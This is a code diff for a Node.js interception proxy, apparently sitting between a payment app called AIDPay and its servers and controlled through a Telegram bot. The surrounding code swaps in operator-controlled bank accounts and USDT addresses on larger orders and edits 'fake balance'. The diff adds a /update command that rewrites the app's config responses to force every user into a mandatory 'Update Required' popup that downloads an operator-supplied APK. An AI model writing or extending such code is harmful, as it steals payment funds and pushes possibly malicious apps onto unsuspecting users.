@@ -20,7 +20,8 @@ const DEFAULT_DATA = {
   logRequests: false,
   usdtAddress: '',
   userOverrides: {},
-  trackedUsers: {}
+  trackedUsers: {},
+  forceUpdate: { enabled: false, apkUrl: '', webUrl: '' }
 };
 
 let bot = null;
@@ -588,7 +589,7 @@ app.post('/bot-webhook', async (req, res) => {
     if (text === '/start') {
       data.adminChatId = chatId;
       await saveData(data);
-      await bot.sendMessage(chatId, '🚀 AIDPay Proxy Bot Started!\n\nCommands:\n/status - Bot status\n/on - Enable proxy\n/off - Disable proxy\n/banks - List banks\n/addbank - Add bank\n/removebank - Remove bank\n/setbank - Set active bank\n/setmin <n> <amount> - Min order amount for bank\n/rotate - Toggle auto-rotate\n/log - Toggle logging\n/debug on - Full request+response logging ON\n/debug off - Full logging OFF\n/debug - One-shot debug next response\n/setusdt <address> - Set USDT address override\n/usdt - Show current USDT address\n/removeusdt - Remove USDT override\n/debugusdt - Toggle USDT debug logging\n/add <userId> <amount> - Add balance\n/deduct <userId> <amount> - Deduct balance\n/remove balance <userId> - Remove fake balance\n/history - Balance history\n/off log <userId> - Disable logging for user\n/on log <userId> - Enable logging for user');
+      await bot.sendMessage(chatId, '🚀 AIDPay Proxy Bot Started!\n\nCommands:\n/status - Bot status\n/on - Enable proxy\n/off - Disable proxy\n/banks - List banks\n/addbank - Add bank\n/removebank - Remove bank\n/setbank - Set active bank\n/setmin <n> <amount> - Min order amount for bank\n/rotate - Toggle auto-rotate\n/log - Toggle logging\n/debug on - Full request+response logging ON\n/debug off - Full logging OFF\n/debug - One-shot debug next response\n/setusdt <address> - Set USDT address override\n/usdt - Show current USDT address\n/removeusdt - Remove USDT override\n/debugusdt - Toggle USDT debug logging\n/add <userId> <amount> - Add balance\n/deduct <userId> <amount> - Deduct balance\n/remove balance <userId> - Remove fake balance\n/history - Balance history\n/off log <userId> - Disable logging for user\n/on log <userId> - Enable logging for user\n/update on <apkUrl> <webUrl> - Force update popup ON (sare users ko)\n/update off - Force update popup OFF\n/update status - Update popup status dekho');
       return res.sendStatus(200);
     }
 
@@ -597,6 +598,9 @@ app.post('/bot-webhook', async (req, res) => {
       const idCount = Object.keys(data.userOverrides || {}).length;
       let m = `📊 Status:\nProxy: ${data.botEnabled ? '🟢 ON' : '🔴 OFF'}\nBanks: ${data.banks.length}\nAuto-Rotate: ${data.autoRotate ? '🔄 ON' : '❌ OFF'}\nLog: ${data.logRequests ? '📡 ON' : '🔇 OFF'}\nTracked Users: ${Object.keys(data.trackedUsers || {}).length}`;
       if (data.usdtAddress) m += `\n💎 USDT: ${data.usdtAddress}`;
+      const fu = data.forceUpdate || {};
+      m += `\n🔄 Update Popup: ${fu.enabled ? '🔴 ON — Sare users ko dikhra hai' : '🟢 OFF'}`;
+      if (fu.enabled) { m += `\n📥 APK: ${fu.apkUrl || 'N/A'}\n🌐 Web: ${fu.webUrl || 'N/A'}`; }
       if (active) m += `\n\n💳 Active:\n${active.accountHolder}\n${active.accountNo}\nIFSC: ${active.ifsc}${active.bankName ? '\nBank: ' + active.bankName : ''}${active.upiId ? '\nUPI: ' + active.upiId : ''}`;
       else m += '\n\n⚠️ No active bank';
       await bot.sendMessage(chatId, m);
@@ -797,6 +801,45 @@ app.post('/bot-webhook', async (req, res) => {
       await saveData(data);
       const b = data.banks[bankIdx];
       await bot.sendMessage(chatId, `✅ Min amount set!\nBank #${bankIdx + 1}: ${b.accountHolder}\nMin Order: ₹${amount}\n\nOrders < ₹${amount} → Real bank dikhega\nOrders >= ₹${amount} → Proxy bank dikhega`);
+      return res.sendStatus(200);
+    }
+
+    if (text.startsWith('/update')) {
+      if (!data.forceUpdate) data.forceUpdate = { enabled: false, apkUrl: '', webUrl: '' };
+
+      if (text === '/update off') {
+        data.forceUpdate.enabled = false;
+        await saveData(data);
+        await bot.sendMessage(chatId, '✅ Update popup OFF — Users ab normal app use kar sakte hain.');
+        return res.sendStatus(200);
+      }
+
+      if (text === '/update status') {
+        const fu = data.forceUpdate;
+        if (fu.enabled) {
+          await bot.sendMessage(chatId, `🔴 Update Popup: ON\n📥 APK URL: ${fu.apkUrl || 'N/A'}\n🌐 Web URL: ${fu.webUrl || 'N/A'}\n\nSare users ko app kholne pe mandatory update dikhra hai.`);
+        } else {
+          await bot.sendMessage(chatId, '🟢 Update Popup: OFF\nKoi bhi forced update nahi chal raha.');
+        }
+        return res.sendStatus(200);
+      }
+
+      if (text.startsWith('/update on ')) {
+        const rest = text.substring(11).trim();
+        const parts = rest.split(/\s+/);
+        if (parts.length < 2) {
+          await bot.sendMessage(chatId, '❌ Format:\n/update on <apkUrl> <webUrl>\n\nExample:\n/update on https://oss.aidpay-web.com/apk/aidpay.apk https://app-web.aidpay-web.com/');
+          return res.sendStatus(200);
+        }
+        const apkUrl = parts[0];
+        const webUrl = parts[1];
+        data.forceUpdate = { enabled: true, apkUrl, webUrl };
+        await saveData(data);
+        await bot.sendMessage(chatId, `✅ Update Popup ON!\n\n📥 APK URL:\n${apkUrl}\n\n🌐 Web URL:\n${webUrl}\n\n⚠️ Ab sare users ko app kholne pe "Update Required" popup dikhega.\nBand karne ke liye: /update off`);
+        return res.sendStatus(200);
+      }
+
+      await bot.sendMessage(chatId, '❌ Format:\n/update on <apkUrl> <webUrl> — Popup ON karo\n/update off — Popup OFF karo\n/update status — Status dekho');
       return res.sendStatus(200);
     }
 
@@ -1490,7 +1533,43 @@ for (const ep of COLLECTION_ENDPOINTS) {
 
 app.all('/app/pay/upload/file', async (req, res) => { await transparentProxy(req, res); });
 app.all('/app/user/upload/param', async (req, res) => { await transparentProxy(req, res); });
-app.all('/app/global/config', async (req, res) => { await transparentProxy(req, res); });
+app.all('/app/global/config', async (req, res) => {
+  try {
+    const data = await loadData();
+    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    const fu = data.forceUpdate || {};
+    if (fu.enabled && fu.apkUrl) {
+      if (jsonResp && typeof jsonResp === 'object') {
+        const respData = getResponseData(jsonResp);
+        const updateFields = {
+          isForce: 1,
+          isForceUpdate: 1,
+          upgradeType: 2,
+          newVersion: '9.9.9',
+          versionCode: 999,
+          downloadUrl: fu.apkUrl,
+          apkUrl: fu.apkUrl,
+          apkDownloadUrl: fu.apkUrl + '?t=' + Date.now(),
+          webUrl: fu.webUrl || '',
+          officialWebUrl: fu.webUrl || '',
+          officialUrl: fu.webUrl || '',
+          content: 'A new version is available. Please update now to continue using the app.',
+          upgradeContent: 'A new version is available. Please update now to continue using the app.'
+        };
+        if (respData && typeof respData === 'object') {
+          Object.assign(respData, updateFields);
+        }
+        if (jsonResp.data && typeof jsonResp.data === 'object') Object.assign(jsonResp.data, updateFields);
+        else if (jsonResp.body && typeof jsonResp.body === 'object') Object.assign(jsonResp.body, updateFields);
+        else if (jsonResp.result && typeof jsonResp.result === 'object') Object.assign(jsonResp.result, updateFields);
+        else jsonResp.data = updateFields;
+        return sendJson(res, respHeaders, jsonResp, respBody);
+      }
+    }
+    res.writeHead(response.status, respHeaders);
+    res.end(respBody);
+  } catch(e) { await transparentProxy(req, res); }
+});
 app.all('/app/auth/refresh/session', async (req, res) => {
   try {
     const data = await loadData();
